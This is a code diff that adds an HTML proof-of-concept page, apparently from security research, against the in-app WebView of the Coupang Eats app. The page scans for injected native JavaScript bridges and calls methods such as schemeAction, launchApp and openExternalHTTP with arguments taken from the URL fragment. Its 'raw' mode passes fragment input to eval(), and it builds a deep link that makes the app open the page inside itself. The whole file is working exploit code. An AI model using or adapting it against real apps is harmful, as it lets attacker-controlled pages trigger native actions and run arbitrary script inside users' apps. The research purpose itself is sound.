@@ -1,0 +1,94 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>bridge-probe</title>
+<style>
+body{font:13px/1.45 monospace;margin:0;padding:10px;background:#fff;color:#111}
+h2{font-size:15px;margin:4px 0 8px}
+#o{white-space:pre-wrap;word-break:break-all;background:#f3f3f3;border:1px solid #bbb;padding:8px}
+#r{font-size:17px;font-weight:bold;color:#fff;background:#b00020;padding:10px;margin:8px 0}
+a.b{display:block;padding:16px;background:#b00020;color:#fff;font-size:17px;text-decoration:none;margin:10px 0;text-align:center}
+.ok{color:#060}
+</style></head><body>
+<h2 id="h">attacker page (researcher-owned origin)</h2>
+<div id="r">&nbsp;</div>
+<pre id="o"></pre>
+<div id="l"></div>
+<script>
+var SELF = location.origin + location.pathname;
+function W(s){document.getElementById('o').textContent += s + "\n";}
+function R(s){document.getElementById('r').textContent = s; document.title = s;}
+
+// ---- parse #m=<method>&a=<arg>
+var H = {}, raw = location.hash.replace(/^#/,'');
+raw.split('&').forEach(function(p){ if(!p) return; var i=p.indexOf('='); if(i<0){H[p]=''} else {H[decodeURIComponent(p.slice(0,i))]=decodeURIComponent(p.slice(i+1));} });
+var MODE = H.m || 'probe', ARG = H.a || '';
+
+// ---- discover injected native bridges by capability, not by name
+var METHODS = ['schemeAction','parseScheme','launchApp','addLocalNotification','openShareSheet',
+               'openExternalHTTP','gotoStore','openAppstore','deviceStatus','getLocationInfo',
+               'moveToNotificationSetting','hasAlarmPermission','close','receiptConfirmed',
+               'setTitle','setTitleName','hideNaviBar','showLoading','setHeaderState',
+               'notifyEvent','logEvent','logByPass','closePopupWebView','showPopupWebView',
+               'setPopupWebViewHeight'];
+var BRIDGES = {}, nFound = 0;
+var props = [];
+try { props = Object.getOwnPropertyNames(window); } catch(e) {}
+for (var k in window) { if (props.indexOf(k) < 0) props.push(k); }
+props.forEach(function(k){
+  var v; try { v = window[k]; } catch(e){ return; }
+  if (!v || (typeof v !== 'object' && typeof v !== 'function')) return;
+  var ms = [];
+  METHODS.forEach(function(m){ try { if (typeof v[m] === 'function') ms.push(m); } catch(e){} });
+  if (ms.length) { BRIDGES[k] = ms; nFound++; }
+});
+function find(meth){ for (var k in BRIDGES) { if (BRIDGES[k].indexOf(meth) >= 0) return window[k]; } return null; }
+
+W('url     : ' + location.href);
+W('ua      : ' + navigator.userAgent);
+W('origin  : ' + location.origin + '   (https, researcher-owned GitHub Pages)');
+W('native bridges discovered: ' + nFound);
+for (var k in BRIDGES) W('  window.' + k + ' = ' + (typeof window[k]) + '  ->  ' + BRIDGES[k].join(', '));
+if (nFound === 0) W('  (none - no native bridge is bound to this WebView)');
+
+// callbacks the native side calls back into
+window.__cb = function(v){ W('CALLBACK __cb(' + v + ')'); R('RESULT ' + MODE + ' -> callback(' + v + ')'); };
+window.__BRIDGE_CALLBACK = function(s){ W('CALLBACK __BRIDGE_CALLBACK(' + s + ')'); };
+
+function run(){
+  var b, out;
+  try {
+    if (MODE === 'probe') { R(nFound ? 'IN-APP: ' + nFound + ' native bridges bound' : 'BASELINE: 0 native bridges'); return; }
+    if (nFound === 0) { R('BASELINE ' + MODE + ': bridge undefined, nothing invoked'); W('no bridge -> ' + MODE + ' NOT invoked'); return; }
+
+    if (MODE === 'scheme') { b = find('schemeAction');
+      W('calling schemeAction({"url":"' + ARG + '","callback":"__cb"})');
+      b.schemeAction(JSON.stringify({url: ARG, callback: '__cb'})); R('schemeAction SENT: ' + ARG); return; }
+    if (MODE === 'parse') { b = find('parseScheme');
+      W('calling parseScheme("' + ARG + '")'); b.parseScheme(ARG); R('parseScheme SENT: ' + ARG); return; }
+    if (MODE === 'launch') { b = find('launchApp');
+      W('calling launchApp("' + ARG + '")'); out = b.launchApp(ARG);
+      W('launchApp returned: ' + out); R('launchApp("' + ARG + '") -> ' + out); return; }
+    if (MODE === 'ext') { b = find('openExternalHTTP');
+      W('calling openExternalHTTP("' + ARG + '")'); b.openExternalHTTP(ARG); R('openExternalHTTP SENT'); return; }
+    if (MODE === 'share') { b = find('openShareSheet');
+      W('calling openShareSheet("' + ARG + '")'); b.openShareSheet(ARG); R('openShareSheet SENT'); return; }
+    if (MODE === 'notif') { b = find('addLocalNotification');
+      W('calling addLocalNotification(' + ARG + ')'); b.addLocalNotification(ARG); R('addLocalNotification SENT'); return; }
+    if (MODE === 'title') { b = find('setTitle');
+      W('calling setTitle("' + ARG + '")'); b.setTitle(ARG); R('setTitle SENT: ' + ARG); return; }
+    if (MODE === 'event') { b = find('notifyEvent');
+      W('calling notifyEvent(' + ARG + ')'); b.notifyEvent(ARG); R('notifyEvent SENT'); return; }
+    if (MODE === 'raw') { W('eval: ' + ARG); out = eval(ARG); W('-> ' + out); R('raw -> ' + out); return; }
+    R('unknown mode ' + MODE);
+  } catch (e) { W('EXCEPTION: ' + e); R('EXCEPTION ' + e); }
+}
+
+var dl = 'coupangpayeats://coupaypopupwebview?url=' + encodeURIComponent(SELF + (raw ? '#' + raw : ''));
+document.getElementById('l').innerHTML =
+  '<a class="b" href="' + dl.replace(/"/g,'&quot;') + '">TAP: open this same page inside Coupang Eats</a>' +
+  '<div style="font-size:11px;word-break:break-all">' + dl.replace(/</g,'&lt;') + '</div>';
+
+setTimeout(run, 400);
+</script>
+</body></html>
